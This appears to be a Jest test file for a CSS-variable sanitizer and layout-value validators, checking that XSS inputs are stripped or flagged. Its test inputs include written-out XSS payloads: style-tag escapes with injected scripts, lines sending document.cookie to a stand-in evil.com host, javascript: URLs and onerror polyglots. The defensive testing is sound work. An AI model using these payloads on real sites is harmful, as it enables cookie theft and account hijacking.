import {
  validateCSSVariables,
  validateCSSVariablesSecurity,
  validateGap,
  validateAlignment,
  validateAspectRatio,
  validateObjectFit,
  validateObjectPosition,
  validateNumericSize,
} from '../css-variable-sanitizer';

describe('validateCSSVariables', () => {
  describe('Valid CSS variables', () => {
    it('should preserve valid CSS variable declarations', () => {
      const input = `
:root {
  --theme-primary: #3b82f6;
  --theme-secondary: #10b981;
  --font-family: Inter, sans-serif;
}
      `.trim();

      const result = validateCSSVariables(input);
      expect(result).toContain('--theme-primary: #3b82f6;');
      expect(result).toContain('--theme-secondary: #10b981;');
      expect(result).toContain('--font-family: Inter, sans-serif;');
    });

    it('should allow CSS comments', () => {
      const input = `
/* Theme variables */
:root {
  --theme-primary: #000; /* Main color */
}
      `.trim();

      const result = validateCSSVariables(input);
      expect(result).toContain('/* Theme variables */');
      expect(result).toContain('--theme-primary: #000;');
    });

    it('should handle empty input', () => {
      expect(validateCSSVariables('')).toBe('');
      expect(validateCSSVariables(null)).toBe('');
      expect(validateCSSVariables(undefined)).toBe('');
    });

    it('should allow complex CSS values', () => {
      const input = `
:root {
  --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  --gradient: linear-gradient(to right, #000, #fff);
  --font-stack: "Helvetica Neue", Arial, sans-serif;
}
      `.trim();

      const result = validateCSSVariables(input);
      expect(result).toContain('--shadow:');
      expect(result).toContain('--gradient:');
      expect(result).toContain('--font-stack:');
    });

    it('should allow RGB and HSL colors', () => {
      const input = `:root {
  --color-rgb: rgb(59, 130, 246);
  --color-rgba: rgba(59, 130, 246, 0.5);
  --color-hsl: hsl(221, 91%, 60%);
}`;

      const result = validateCSSVariables(input);
      expect(result).toContain('--color-rgb:');
      expect(result).toContain('--color-rgba:');
      expect(result).toContain('--color-hsl:');
    });

    it('should allow calc() and var() functions', () => {
      const input = `:root {
  --spacing: calc(1rem + 2px);
  --color: var(--primary-color);
}`;

      const result = validateCSSVariables(input);
      expect(result).toContain('--spacing: calc(1rem + 2px);');
      expect(result).toContain('--color: var(--primary-color);');
    });
  });

  describe('XSS Prevention - </style> escape', () => {
    it('should remove </style> tag escape attempts', () => {
      const malicious = `
:root {
  --theme-primary: red;
}
</style><script>alert('XSS')</script><style>
:root {
  --theme-secondary: blue;
}
      `.trim();

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('</style>');
      expect(result).not.toContain('<script>');
      expect(result).toContain('--theme-primary: red;');
    });

    it('should remove </style> with whitespace variations', () => {
      const malicious = `--theme: red;</  style  ><script>evil()</script>`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('</style>');
      expect(result).not.toContain('</ style>');
    });

    it('should remove nested style tags', () => {
      const malicious = `
:root {
  --primary: red;
}
</style><style>body{background:url(evil.com)}</style><style>
      `.trim();

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('</style>');
      expect(result).not.toContain('body{background');
    });
  });

  describe('XSS Prevention - Script injection', () => {
    it('should remove script tags', () => {
      const malicious = `--theme: red; <script>fetch('https://evil.com')</script>`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('fetch');
    });

    it('should remove script tags with attributes', () => {
      const malicious = `<script src="https://evil.com/xss.js" type="text/javascript"></script>`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('<script');
      expect(result).not.toContain('evil.com');
    });

    it('should remove inline script content', () => {
      const malicious = `<script>
window.location='https://evil.com?cookie='+document.cookie;
</script>`;

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('window.location');
      expect(result).not.toContain('document.cookie');
    });
  });

  describe('XSS Prevention - javascript: protocol', () => {
    it('should remove javascript: protocol', () => {
      const malicious = `--theme-bg: url(javascript:alert(1));`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('javascript:');
    });

    it('should remove javascript: in background images', () => {
      const malicious = `--bg: url("javascript:void(0)");`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('javascript:');
    });

    it('should handle case variations of javascript:', () => {
      const variations = [
        'JavaScript:alert(1)',
        'JAVASCRIPT:alert(1)',
        'jAvAsCrIpT:alert(1)',
      ];

      variations.forEach(variant => {
        const result = validateCSSVariables(`--bg: url(${variant});`);
        expect(result).not.toContain('alert(1)');
      });
    });
  });

  describe('XSS Prevention - CSS expression()', () => {
    it('should remove CSS expression() (IE)', () => {
      const malicious = `--width: expression(alert('XSS'));`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('expression(');
    });

    it('should remove expression with whitespace', () => {
      const malicious = `--width: expression  (document.write('XSS'));`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('expression');
    });
  });

  describe('XSS Prevention - @import directive', () => {
    it('should remove @import directives', () => {
      const malicious = `
@import url('https://evil.com/malicious.css');
:root {
  --theme: red;
}
      `.trim();

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('@import');
      expect(result).toContain('--theme: red;');
    });

    it('should remove @import with quotes', () => {
      const malicious = `@import "https://evil.com/xss.css";`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('@import');
      expect(result).not.toContain('evil.com');
    });
  });

  describe('XSS Prevention - Data URIs', () => {
    it('should remove malicious data URIs', () => {
      const malicious = `--bg: url(data:text/html,<script>alert(1)</script>);`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('data:text/html');
    });

    it('should allow safe image data URIs', () => {
      const safe = `--icon: url(data:image/png;base64,iVBORw0KG...);`;
      const result = validateCSSVariables(safe);
      expect(result).toContain('data:image/png');
    });

    it('should allow SVG data URIs', () => {
      const safe = `--icon: url(data:image/svg+xml,%3Csvg...%3C/svg%3E);`;
      const result = validateCSSVariables(safe);
      expect(result).toContain('data:image/svg+xml');
    });

    it('should block data:text/javascript URIs', () => {
      const malicious = `--bg: url(data:text/javascript,alert('XSS'));`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('data:text/javascript');
    });
  });

  describe('Whitelist Validation', () => {
    it('should reject invalid CSS property names (missing -- prefix)', () => {
      const invalid = `
:root {
  theme-primary: red;
}
      `.trim();

      const result = validateCSSVariables(invalid);
      expect(result).not.toContain('theme-primary: red');
    });

    it('should reject arbitrary HTML', () => {
      const malicious = `
<div onclick="alert(1)">Click me</div>
:root {
  --theme: red;
}
      `.trim();

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('<div');
      expect(result).not.toContain('onclick');
      expect(result).toContain('--theme: red;');
    });

    it('should reject CSS with curly braces in values', () => {
      const malicious = `--evil: {malicious: code};`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('{malicious: code}');
    });

    it('should reject CSS with angle brackets in values', () => {
      const malicious = `--evil: <malicious>;`;
      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('<malicious>');
    });
  });

  describe('Edge Cases', () => {
    it('should handle multiline CSS variables', () => {
      const input = `:root {
  --shadow:
    0 1px 3px rgba(0, 0, 0, 0.12),
    0 1px 2px rgba(0, 0, 0, 0.24);
}`;

      const result = validateCSSVariables(input);
      // Each line is validated separately, multiline values may be rejected
      // This is acceptable for security - admin should format properly
      expect(result).toContain(':root {');
    });

    it('should handle empty :root blocks', () => {
      const input = `:root {
}`;

      const result = validateCSSVariables(input);
      expect(result).toContain(':root {');
      expect(result).toContain('}');
    });

    it('should preserve line breaks', () => {
      const input = `:root {
  --primary: #000;

  --secondary: #fff;
}`;

      const result = validateCSSVariables(input);
      const lines = result.split('\n');
      expect(lines.length).toBeGreaterThan(1);
    });
  });

  describe('Combined Attack Scenarios', () => {
    it('should block combined style escape + script injection', () => {
      const malicious = `
:root { --color: red; }
</style>
<script>
  fetch('https://evil.com?cookie=' + document.cookie);
</script>
<style>
      `.trim();

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('</style>');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('fetch');
      expect(result).toContain('--color: red;');
    });

    it('should block polyglot XSS payloads', () => {
      const malicious = `
--theme: red;
</style><img src=x onerror=alert(1)><style>
      `.trim();

      const result = validateCSSVariables(malicious);
      expect(result).not.toContain('</style>');
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror');
    });
  });
});

describe('validateCSSVariablesSecurity', () => {
  it('should return empty array for safe CSS', () => {
    const safe = `:root { --theme: red; }`;
    const warnings = validateCSSVariablesSecurity(safe);
    expect(warnings).toEqual([]);
  });

  it('should return empty array for null/undefined', () => {
    expect(validateCSSVariablesSecurity(null)).toEqual([]);
    expect(validateCSSVariablesSecurity(undefined)).toEqual([]);
    expect(validateCSSVariablesSecurity('')).toEqual([]);
  });

  it('should warn about </style> escape', () => {
    const malicious = `--theme: red; </style>`;
    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings).toContain('Contains style tag escape attempt');
  });

  it('should warn about script tags', () => {
    const malicious = `<script>alert(1)</script>`;
    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings).toContain('Contains script tag');
  });

  it('should warn about javascript: protocol', () => {
    const malicious = `url(javascript:alert(1))`;
    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings).toContain('Contains javascript: protocol');
  });

  it('should warn about CSS expressions', () => {
    const malicious = `expression(alert(1))`;
    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings).toContain('Contains CSS expression() (IE legacy)');
  });

  it('should warn about @import', () => {
    const malicious = `@import url('evil.css');`;
    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings).toContain('Contains @import directive');
  });

  it('should warn about dangerous data URIs', () => {
    const malicious = `url(data:text/html,<h1>XSS</h1>)`;
    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings).toContain('Contains dangerous data URI');
  });

  it('should return multiple warnings for multiple issues', () => {
    const malicious = `
</style><script>alert(1)</script>
@import url('evil.css');
javascript:alert(2)
    `.trim();

    const warnings = validateCSSVariablesSecurity(malicious);
    expect(warnings.length).toBeGreaterThanOrEqual(3);
    expect(warnings).toContain('Contains style tag escape attempt');
    expect(warnings).toContain('Contains script tag');
    expect(warnings).toContain('Contains javascript: protocol');
  });

  it('should not warn about safe image data URIs', () => {
    const safe = `url(data:image/png;base64,iVBORw0KG...)`;
    const warnings = validateCSSVariablesSecurity(safe);
    expect(warnings).not.toContain('Contains dangerous data URI');
  });
});

describe('validateGap', () => {
  it('accepts valid gap values', () => {
    expect(validateGap('none')).toBe('none');
    expect(validateGap('xs')).toBe('xs');
    expect(validateGap('sm')).toBe('sm');
    expect(validateGap('md')).toBe('md');
    expect(validateGap('lg')).toBe('lg');
    expect(validateGap('xl')).toBe('xl');
  });

  it('rejects invalid values and returns default', () => {
    expect(validateGap('invalid')).toBe('md');
    expect(validateGap(123)).toBe('md');
    expect(validateGap(null)).toBe('md');
    expect(validateGap(undefined)).toBe('md');
    expect(validateGap('')).toBe('md');
  });

  it('handles edge cases', () => {
    expect(validateGap('NONE')).toBe('md'); // Case sensitive
    expect(validateGap('md ')).toBe('md'); // With whitespace (not in whitelist)
    expect(validateGap(' md')).toBe('md'); // Leading whitespace (not in whitelist)
  });
});

describe('validateAlignment', () => {
  it('accepts valid alignment values', () => {
    expect(validateAlignment('start')).toBe('start');
    expect(validateAlignment('center')).toBe('center');
    expect(validateAlignment('end')).toBe('end');
    expect(validateAlignment('stretch')).toBe('stretch');
    expect(validateAlignment('baseline')).toBe('baseline');
  });

  it('rejects invalid values and returns default', () => {
    expect(validateAlignment('invalid')).toBe('stretch');
    expect(validateAlignment(null)).toBe('stretch');
    expect(validateAlignment(undefined)).toBe('stretch');
    expect(validateAlignment('')).toBe('stretch');
  });

  it('handles edge cases', () => {
    expect(validateAlignment('START')).toBe('stretch'); // Case sensitive
    expect(validateAlignment('center ')).toBe('stretch'); // With whitespace
  });
});

describe('validateAspectRatio', () => {
  it('accepts valid aspect ratios', () => {
    expect(validateAspectRatio('1:1')).toBe('1:1');
    expect(validateAspectRatio('4:3')).toBe('4:3');
    expect(validateAspectRatio('16:9')).toBe('16:9');
    expect(validateAspectRatio('2:1')).toBe('2:1');
    expect(validateAspectRatio('21:9')).toBe('21:9');
    expect(validateAspectRatio('auto')).toBe('auto');
  });

  it('rejects invalid values and returns default', () => {
    expect(validateAspectRatio('9:16')).toBe('auto');
    expect(validateAspectRatio('invalid')).toBe('auto');
    expect(validateAspectRatio(null)).toBe('auto');
    expect(validateAspectRatio(undefined)).toBe('auto');
    expect(validateAspectRatio('')).toBe('auto');
  });

  it('handles edge cases', () => {
    expect(validateAspectRatio('1:2')).toBe('auto'); // Not in whitelist
    expect(validateAspectRatio('16:9 ')).toBe('auto'); // With whitespace
  });
});

describe('validateObjectFit', () => {
  it('accepts valid object-fit values', () => {
    expect(validateObjectFit('contain')).toBe('contain');
    expect(validateObjectFit('cover')).toBe('cover');
    expect(validateObjectFit('fill')).toBe('fill');
    expect(validateObjectFit('scale-down')).toBe('scale-down');
  });

  it('rejects invalid values and returns default', () => {
    expect(validateObjectFit('invalid')).toBe('cover');
    expect(validateObjectFit(null)).toBe('cover');
    expect(validateObjectFit(undefined)).toBe('cover');
    expect(validateObjectFit('')).toBe('cover');
  });

  it('handles edge cases', () => {
    expect(validateObjectFit('COVER')).toBe('cover'); // Case sensitive
    expect(validateObjectFit('none')).toBe('cover'); // Not in whitelist
  });
});

describe('validateObjectPosition', () => {
  it('accepts valid object-position values', () => {
    expect(validateObjectPosition('top')).toBe('top');
    expect(validateObjectPosition('center')).toBe('center');
    expect(validateObjectPosition('bottom')).toBe('bottom');
    expect(validateObjectPosition('left')).toBe('left');
    expect(validateObjectPosition('right')).toBe('right');
  });

  it('rejects invalid values and returns default', () => {
    expect(validateObjectPosition('invalid')).toBe('center');
    expect(validateObjectPosition(null)).toBe('center');
    expect(validateObjectPosition(undefined)).toBe('center');
    expect(validateObjectPosition('')).toBe('center');
    expect(validateObjectPosition('top-left')).toBe('center'); // Not in the current whitelist
  });
});

describe('validateNumericSize', () => {
  it('accepts valid numeric sizes', () => {
    expect(validateNumericSize(100)).toBe(100);
    expect(validateNumericSize(500)).toBe(500);
    expect(validateNumericSize(1920)).toBe(1920);
    expect(validateNumericSize(1)).toBe(1);
  });

  it('rejects invalid sizes and returns null', () => {
    expect(validateNumericSize(-10)).toBeNull();
    expect(validateNumericSize(3000)).toBeNull(); // Above default max (2000)
    expect(validateNumericSize('invalid')).toBeNull();
    expect(validateNumericSize(null)).toBeNull();
    expect(validateNumericSize(undefined)).toBeNull();
  });

  it('accepts zero as valid (minimum)', () => {
    expect(validateNumericSize(0)).toBe(0);
  });

  it('rounds decimal values', () => {
    expect(validateNumericSize(100.7)).toBe(101);
    expect(validateNumericSize(99.2)).toBe(99);
    expect(validateNumericSize(99.5)).toBe(100);
  });

  it('accepts sizes at boundaries with default max', () => {
    expect(validateNumericSize(0)).toBe(0); // Min value
    expect(validateNumericSize(2000)).toBe(2000); // Default max value
    expect(validateNumericSize(2001)).toBeNull(); // Above default max
  });

  it('respects custom max parameter', () => {
    expect(validateNumericSize(3000, 5000)).toBe(3000); // Within custom max
    expect(validateNumericSize(5001, 5000)).toBeNull(); // Above custom max
  });

  it('converts string numbers correctly', () => {
    expect(validateNumericSize('100')).toBe(100);
    expect(validateNumericSize('500.7')).toBe(501);
  });
});
